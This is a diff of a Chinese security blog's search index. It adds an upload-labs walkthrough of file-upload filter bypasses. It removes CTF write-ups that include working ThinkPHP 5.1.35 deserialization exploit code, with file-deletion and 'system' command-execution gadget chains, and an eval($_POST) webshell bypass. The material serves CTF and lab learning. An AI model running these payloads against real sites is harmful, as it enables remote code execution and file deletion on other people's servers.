HTTPS代理标识</span></span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// IP代理获取标识</span></span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="comment">// URL伪静态后缀</span></span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>]=[<span class="variable language_">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filter=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230305165150060.png" alt="image-20230305165150060"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>upload-labs关卡</title>
+    <url>/2022/11/19/upload-labs/</url>
+    <content><![CDATA[<p>简介</p>
+<span id="more"></span>
+
+<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>js绕过<br>只允许上传.jpg|.png|.gif后缀的文件<br>那就上传.gif的文件<br>使用burp抓包<br>在burp里修改后缀.gif为.php然后执行</p>
+<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>mime头检测(会自动检测文件类型)<br>上传.php后缀的文件<br>使用burp抓包里面的Content-Type是来标识该文件是个什么类型的文件（php还是jpg或者gif等等)<br>将Content-Type后改为image&#x2F;jpeg让代码以为上传的php文件是可以通过的文件<br>然后放包</p>
+<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>源代码$deny_ext &#x3D; array(‘.asp’,’.aspx’,’.php’,’.jsp’);这个意思是.asp .aspx .php .jsp的文件都不能上传，如果检测到就进行拦截。<br>使用不常见的后缀，比如.php3 .php2等等</p>
+<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>源代码$deny_ext &#x3D; array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”)<br>这条语句几乎将不常用的后缀都已经拦截<br>所以上传.htaccess文件，让他把任何文件都当做”.php”去读取，这就是.htaccess的功能<br>写入.htacess文件一下内容<br>&lt;FilesMatch “jpg”&gt;&#x2F;&#x2F;为指定上传的文件后缀起作用<br>SetHandler application&#x2F;x-httpd-php&#x2F;&#x2F;是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错<br><br>然后再上传一个jpg后缀的文件就可以了</p>
+<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>方法一(?)<br>除了拦截的后缀的第四关一样又拦截了.htaccess<br>但源代码里没有循环，这些语句只会执行一次<br>在burp里进行修改为xx.php. .再放包<br>只要保证有两个分开的点就行了演示过程中是最简的方法，两个点放在一起会被防护规则同时删除掉<br>由于Windows系统的命名规则，无论你后缀有多少个空格和点他都会给你自动删除掉<br>方法二<br>源代码里没有了转换为小写<br>上传.php文件后<br>再burp中改为.phP<br>直接放包</p>
+<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关(?)"></a>第六关(?)</h3><p>源代码里没有了首尾去空，可以上传.php文件然后用burp抓包<br>在burp中在.php后加一个空格然后再放包</p>
+<h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p>源代码里没有了删除文件名末尾的点<br>上传.php文件后<br>再burp中改为.php.<br>直接放包</p>
+<h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><p>源代码中没有了去除字符串::$DATA<br>上传.php文件后<br>再burp中改为.php::$DATA<br>直接放包</p>
+<h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p>上传.php文件<br>使用burp抓包<br>然后在burp里修改为.php. .<br>最后放包</p>
+<h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p>上传.php文件<br>使用burp抓包<br>然后在burp里修改为.pphphp<br>最后放包</p>
+<h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关(?)"></a>第十一关(?)</h3><h3 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关(?)"></a>第十二关(?)</h3><h3 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h3><h3 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h3><h3 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h3><p>将一个.php文件个一个.jpg文件和成一个.jpg文件<br>在cmd中使用copy &#x2F;b xx.jpg+xx.php&#x3D;xx.jpg<br>使用burp抓包<br>进行发送</p>
+<h3 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关(?)"></a>第十六关(?)</h3><p>二次渲染</p>
+<h3 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h3><p>条件竞争<br>上传.php文件<br>进入intruder进行攻击<br>然后在positions中将§<?php phpinfo();?>§修改为§<?php phpinfo();?>§1§<br>然后进入payloads中进行循环攻击10000次<br>最后直接询问网站</p>
+<h3 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h3><p>图片型的条件竞争<br>上传.jpg文件进入intruder进行攻击<br>然后在positions中将§<?php phpinfo();?>§修改为§<?php phpinfo();?>§1§<br>然后进入payloads中进行循环攻击10000次<br>最后直接询问网站</p>
+<h3 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h3><p>该题在网页上不仅可以上传文件还可以修改文件名称<br>上传.php文件<br>然后在网页上将文件名修改为.PHP然后进行上传<br>直接访问网页</p>
+<h3 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关(?)"></a>第二十关(?)</h3>]]></content>
+  </entry>
+  <entry>
     <title>sql注入</title>
     <url>/2022/11/19/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>sql注入的部分类型</p>
@@ -1143,200 +1357,6 @@
 <h2 id="八-堆叠注入"><a href="#八-堆叠注入" class="headerlink" title="八.堆叠注入"></a>八.堆叠注入</h2><p>1.原理:在SQL中使用;来使条sql语句结束，我们可以在一条sql语句结束后再构造一个sql语句，例如:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users;show databases; </span><br><span class="line">在用一行输入，可以返回这两个语句的查询</span><br></pre></td></tr></table></figure>
 
-]]></content>
-  </entry>
-  <entry>
-    <title>buuctf的部分解题</title>
-    <url>/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>tp反序列化漏洞</p>
-<span id="more"></span>
-
-<h3 id="tp6"><a href="#tp6" class="headerlink" title="tp6"></a>tp6</h3><p>链子：__destruct()——&gt;save()——&gt;updateData()——&gt;checkAllowFields()——&gt;db()——&gt;$this-&gt;table . $this-&gt;suffix（字符串拼接）——&gt;toString()</p>
-<p>$this-&gt;exists &#x3D; true;<br>$this-&gt;$lazySave &#x3D; true;<br>$this-&gt;$withEvent &#x3D; false;</p>
-<p>__destruct()到save()</p>
-<p>让lazySave为真</p>
-<p>save()到updateData()</p>
-<p>需要先进入到isEmpty()让data不为空，再进入trigger()让withEvent为false</p>
-<p>updateData()到getChangedData()</p>
-<p>让force为true</p>
-<p>$data 为非空</p>
-<p>getChangedData()继续到checkAllowFields()</p>
-<p>$field和$schema 为空</p>
-<p>db()到__toString()</p>
-<p>__toString()到toJson()到toArray()</p>
-<p>toArray()到getAttr()</p>
-<p>$key的值传到getData()</p>
-<p>getAttr()到getData()</p>
-<p>传入的值不为空</p>
-<p>getData()到getRealFieldName()</p>
-<p>当$this-&gt;strict为true时直接返回$name，即$key</p>
-<p>回到getData()，此时$fieldName &#x3D; $key</p>
-<p>返回$this-&gt;data[$fielName]也就是$this-&gt;data[$key]，记为$value</p>
-<p>从getData()再回到getAttr()再到getValue()</p>
-<h3 id="tp6-0"><a href="#tp6-0" class="headerlink" title="tp6.0"></a>tp6.0</h3><p>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;Store.php，看save()函数</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303153429066.png" alt="image-20230303153429066"></p>
-<p>跟进write()函数</p>
-<p>在vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php中</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303153728183.png" alt="image-20230303153728183"></p>
-<p>调用了<strong>writeFile</strong>函数，继续跟进</p>
-<p>在<strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php</strong>中</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303153827729.png" alt="image-20230303153827729"></p>
-<p>看到<strong>file_put_contents</strong>函数，能写入文件</p>
-<p>由此倒推</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_put_contents($path,$content,LOCK_EX)中的参数$path,$content来源于writeFile($path,$data)</span><br><span class="line"></span><br><span class="line">writeFile($path,$data)中的参数$path,$data来源于write(String $sessID,String $sessData)</span><br><span class="line"></span><br><span class="line">write(String $sessID,String $sessData)中的参数$sessID,$sessData来源于save()中调用了write()</span><br></pre></td></tr></table></figure>
-
-<p>在save函数中有**getId()**函数，跟进，还有一个setId函数</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303154636521.png" alt="image-20230303154636521"></p>
-<p>结合发现，当传入的id值长度为32时，创建sessionId，然后进行gitId()</p>
-<p>寻找调用<strong>setID</strong>的地方，在<strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;middleware&#x2F;SessionInit.php</strong></p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303191949198.png" alt="image-20230303191949198"></p>
-<p>这还需要利用到getName函数</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/232af69eba7c4ac497f476c9bbd72041.png" alt="img"></p>
-<p>发现控制的是session中的名为PHPSESSID的值，可以利用这个来上传文件</p>
-<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>[GYCTF2020]EasyThinking</p>
-<h3 id="tp5-1-35"><a href="#tp5-1-35" class="headerlink" title="tp5.1.35"></a>tp5.1.35</h3><p>创建漏洞点</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230305165911024.png" alt="image-20230305165911024"></p>
-<p>起点为<code>/thinkphp/library/think/process/pipes/Windows.php</code>的<code>__destruct()</code></p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302145613227.png" alt="image-20230302145613227"></p>
-<p>这里调用了两个函数，先看removeFiles()函数</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302145652860.png" alt="image-20230302145652860"></p>
-<p>$files是可控的，可以删除任意路径的文件</p>
-<p>poc</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="string">&#x27;需要删除文件的路径&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure>
-
-<p>在removeFiles()函数中，file_exist函数会将$filename当作字符串返回</p>
-<p><code>__toString</code> 当一个对象被反序列化后又被当做字符串使用时会被触发</p>
-<p>跟进<code>\thinkphp\library\think\model\concern\Conversion.php</code>，找到<code>__toString</code> 方法</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302154027060.png" alt="image-20230302154027060"></p>
-<p><code>__toString</code> 方法中还有一个toJson方法，查看toJson方法</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302154131074.png" alt="image-20230302154131074"></p>
-<p>继续查看toArray方法，其中重要的部分是</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302154530056.png" alt="image-20230302154530056"></p>
-<p>这里调用了一个<code>getRelation</code>方法，找到<code>\thinkphp\library\think\model\concern\Attribute.php</code>，继续查看<code>getRelation</code>方法</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302160945021.png" alt="image-20230302160945021"></p>
-<p>看toArray方法的重要部分，<code>getRelation</code>方法下有一个<code>if (!$relation)</code>，所以不用管<code>getRelation</code>方法，直接返回空就可以，然后调用了<code>getAttr</code>方法</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302162010393.png" alt="image-20230302162010393"></p>
-<p>里面有一个getData方法</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302162123772.png" alt="image-20230302162123772"></p>
-<p>通过<code>getData</code>函数可以知道<code>$relation</code>的值为<code>$this-&gt;data[$name]</code>，而且这里的类定义使用的是Trait而不是class，因为用到了三个类，需要找一个类其中继承了<code>Attribute</code>类和<code>Conversion</code>类</p>
-<p>在<code>\thinkphp\library\think\Model.php</code>中找到这样一个类</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302164807099.png" alt="image-20230302164807099"></p>
-<p>在缺少一个进行代码执行的点，寻找<code>__call方法</code>，<code>__call</code>一般会存在<code>__call_user_func</code>和<code>__call_user_func_array</code>，php代码执行的终点经常选择这里</p>
-<p>在<code>/thinkphp/library/think/Request.php</code>，找到一个<code>__call</code>函数，<code>__call</code> 调用不可访问或不存在的方法时被调用</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302170634963.png" alt="image-20230302170634963"></p>
-<p>但是因为某些原因，这个方法并不能使用</p>
-<p>但是在Thinkphp的Request类中还有一个功能filter功能，可以尝试覆盖<code>filter</code>的方法去执行代码</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302173603880.png" alt="image-20230302173603880"></p>
-<p>但是这里的$value不可控，需要找到可以控制$value的点，找到input函数</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302205209904.png" alt="image-20230302205209904"></p>
-<p>但是input函数中的参数不可控，还得继续找到可控点，所以找到了param函数，重要部分</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302175226720.png" alt="image-20230302175226720"></p>
-<p>但是还是不可控，继续找可以调用param函数的地方，找到了isAjax函数</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302174824834.png" alt="image-20230302174824834"></p>
-<p>在<code>isAjax</code>函数中，我们可以控制<code>$this-&gt;config[&#39;var_ajax&#39;]</code>，也就意味着param函数中的$name可控，param函数中的$name可控也就意味着input函数中的$name可控</p>
-<p>input函数中有</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302205324936.png" alt="image-20230302205324936"></p>
-<p>可以控制的是name参数，查看getData函数</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302205401346.png" alt="image-20230302205401346"></p>
-<p>这样$data就可控，就想当于可以控制$data，再跟进getFilter函数</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302205554731.png" alt="image-20230302205554731"></p>
-<p>input函数中有</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302210600148.png" alt="image-20230302210600148"></p>
-<p>因为getFilter会直接返回$filter，所以$filter就等于$this-&gt;filter，需要定义<code>$this-&gt;filter</code>为函数名</p>
-<p>这样call_user_func函数的回调函数可控，只剩下回调函数的参数</p>
-<p>再看input函数</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302210753895.png" alt="image-20230302210753895"></p>
-<p>这里可以进行回调，跟进filterValue函数</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302210851115.png" alt="image-20230302210851115"></p>
-<p>分析发现，在input函数中</p>
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230305114544744.png" alt="image-20230305114544744"></p>
-<p>如果<code>$data</code>不可控，如果<code>$data</code>可控，而且<code>$name</code>为空字符串的话，input函数中前面的那些代码if条件就不成立，不构成影响，<code>$data</code>也就是回调函数的参数</p>
-<p>最终，$data和$filter都可控，<code>$value = call_user_func($filter, $value);</code>这样这个就可以使用</p>
-<p>最终poc</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files[]=<span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data=<span class="keyword">array</span>(</span><br><span class="line">              <span class="string">&#x27;feng&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()</span><br><span class="line">            );</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;feng&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;hello&#x27;</span>=&gt;<span class="string">&#x27;world&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Request</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">            <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// HTTPS代理标识</span></span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// IP代理获取标识</span></span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="comment">// URL伪静态后缀</span></span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>]=[<span class="variable language_">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filter=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230305165150060.png" alt="image-20230305165150060"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>buu的upload</title>
-    <url>/2022/12/03/upload%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
-    <content><![CDATA[<p>[ACTF2020 新生赛]Upload	[GXYCTF2019]BabyUpload	[MRCTF2020]你传你🐎呢	[极客大挑战 2019]Upload</p>
-<span id="more"></span>
-
-<h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>1.只允许上传图片</p>
-<p>2.上传含有木马的.jpg文件然后使用burp抓包</p>
-<p>3.将.jpg修改为.php，放包然后无法访问</p>
-<p>4.再将.jpg修改为.phtml，然后放包可以用蚁剑连接(.phtml是 <strong>PHP 2 程序</strong>的标准文件扩展名)</p>
-<h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p>1.上传php后缀的文件，显示<strong>后缀名不能有ph！</strong>，这是对后缀名的限制</p>
-<p>2.上传其他类型的文件显示<strong>上传类型也太露骨了吧！</strong>，这是对<code>Content-Type</code>的限制，修改为<code>image/jpeg</code>即可绕过</p>
-<p>3.上传php木马显示<strong>诶，别蒙我啊，这标志明显还是php啊</strong>，这是对文件的内容做了检测，不能含有&lt;?，只要php版本&lt;7，可以使用<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;mochu7&#39;]);&lt;/script&gt;</code>绕过</p>
-<p>4.对于文件后缀限制这个上传.htaccess，但会显示<strong>上传类型也太露骨了吧！</strong>，修改<code>Content-Type</code>，顺利上传</p>
-<p>5.然后直接上传有木马的jpg文件，最后用蚁剑连接</p>
-<h3 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h3><p>和[GXYCTF2019]BabyUpload一样</p>
